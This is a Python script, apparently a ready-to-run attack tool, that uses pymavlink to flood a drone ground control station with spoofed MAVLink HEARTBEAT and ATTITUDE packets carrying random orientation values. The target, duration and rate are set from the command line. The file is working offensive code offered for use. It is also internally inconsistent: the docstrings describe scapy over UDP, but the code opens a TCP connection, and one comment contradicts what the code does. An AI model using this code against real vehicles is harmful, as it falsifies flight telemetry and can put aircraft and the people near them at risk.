"""MAVLink ATTITUDE spoofing attack via pymavlink UDP.

Sends a stream of heartbeat + ATTITUDE packets to a target GCS UDP endpoint.
"""

from __future__ import annotations

import argparse
import random
import threading
import time

from pymavlink import mavutil


def _encode_heartbeat(mav: mavutil.mavudp) -> bytes:
    """Encode a MAVLink HEARTBEAT message and return raw bytes.

    Args:
        mav: A pymavlink connection used only for its encoder.

    Returns:
        Raw bytes of the encoded HEARTBEAT message.
    """
    msg = mav.mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE,
        mavlink_version=3,
    )
    return msg.pack(mav.mav)


def _encode_attitude(mav: mavutil.mavudp) -> bytes:
    """Encode a MAVLink ATTITUDE message with random spoofed values.

    Roll and pitch are randomised in [-1.0, 1.0], yaw in [-3.14, 3.14],
    and angular rates in [-0.1, 0.1].

    Args:
        mav: A pymavlink connection used only for its encoder.

    Returns:
        Raw bytes of the encoded ATTITUDE message.
    """
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    msg = mav.mav.attitude_encode(
        time_boot_ms=time_boot_ms,
        roll=random.uniform(-1.0, 1.0),
        pitch=random.uniform(-1.0, 1.0),
        yaw=random.uniform(-3.14, 3.14),
        rollspeed=random.uniform(-0.1, 0.1),
        pitchspeed=random.uniform(-0.1, 0.1),
        yawspeed=random.uniform(-0.1, 0.1),
    )
    return msg.pack(mav.mav)


def send_loop(
    target_ip: str,
    target_port: int,
    duration_s: float,
    rate_hz: float,
    stop_event: threading.Event,
) -> None:
    """Send spoofed heartbeat + ATTITUDE packets until duration or stop.

    Each iteration transmits one HEARTBEAT and one ATTITUDE packet via
    scapy UDP to the specified target. The loop exits when ``duration_s``
    seconds have elapsed or ``stop_event`` is set.

    Args:
        target_ip: Destination IP address string.
        target_port: Destination UDP port number.
        duration_s: Maximum run time in seconds.
        rate_hz: Packet-pair send rate in Hz (sleep = 1 / rate_hz).
        stop_event: Threading event; set it to request early termination.
    """
    # Build a dummy in-process MAVLink connection for encoding only.
    # mavlink_connection with 'udpout' never actually opens a socket when
    # we call encode methods directly, but using mavudp directly is the
    # cleanest way to get a MAVLink framer with the right sysid/compid.
    mav = mavutil.mavlink_connection(
        f"tcp:{target_ip}:{target_port}",
        source_system=1,
        source_component=1,
    )

    interval = 1.0 / rate_hz
    deadline = time.monotonic() + duration_s

    while not stop_event.is_set():
        if time.monotonic() >= deadline:
            break

        hb_bytes = _encode_heartbeat(mav)
        att_bytes = _encode_attitude(mav)

        mav.write(hb_bytes)
        mav.write(att_bytes)

        time.sleep(interval)


def _main() -> None:
    parser = argparse.ArgumentParser(
        description="Spoof MAVLink ATTITUDE packets at a GCS endpoint."
    )
    parser.add_argument(
        "target",
        help="Target in host:port format, e.g. 10.13.1.4:14550",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=60.0,
        help="Attack duration in seconds (default: 60)",
    )
    parser.add_argument(
        "--rate",
        type=float,
        default=5.0,
        help="Send rate in Hz (default: 5)",
    )
    args = parser.parse_args()

    host, port_str = args.target.rsplit(":", 1)
    port = int(port_str)

    stop_event = threading.Event()
    try:
        send_loop(
            target_ip=host,
            target_port=port,
            duration_s=args.duration,
            rate_hz=args.rate,
            stop_event=stop_event,
        )
    except KeyboardInterrupt:
        stop_event.set()


if __name__ == "__main__":
    _main()
